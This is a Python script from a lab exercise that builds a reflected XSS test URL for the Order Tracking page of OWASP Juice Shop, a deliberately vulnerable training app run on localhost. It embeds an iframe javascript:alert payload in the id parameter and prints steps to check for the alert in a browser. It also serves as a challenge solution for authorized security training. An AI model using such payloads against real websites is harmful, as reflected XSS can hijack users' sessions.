
#!/usr/bin/env python3
"""
JUICE-003: Reflected Cross-Site Scripting (XSS)

Purpose:
Document the reflected XSS test performed through
the Juice Shop Order Tracking feature.

Testing method:
Modify the tracking ID URL parameter with an XSS payload.

Authorized testing on my own Juice Shop lab instance.
"""

from urllib.parse import quote
import sys

# Juice Shop URL
BASE_URL = (
    sys.argv[1]
    if len(sys.argv) > 1
    else "http://localhost:3000"
)

# Payload used in the Reflected XSS challenge
PAYLOAD = '<iframe src="javascript:alert(`xss`)">'

def main():
    # Encode the payload so it can be placed in the URL.
    encoded_payload = quote(PAYLOAD, safe="")

    # Construct the Order Tracking URL.
    tracking_url = (
        f"{BASE_URL}/#/track-result?id={encoded_payload}"
    )

    print("JUICE-003: Reflected XSS")
    print("Testing feature: Order Tracking")
    print("Payload:", PAYLOAD)

    print("\nCrafted URL:")
    print(tracking_url)

    print("\nInstructions:")
    print("1. Open the crafted URL in your browser.")
    print("2. Refresh the page if necessary.")
    print("3. Observe whether the XSS alert appears.")

    print("\nNote:")
    print("This script generates the test URL.")
    print("JavaScript execution must be verified in a browser.")

if __name__ == "__main__":
    main()
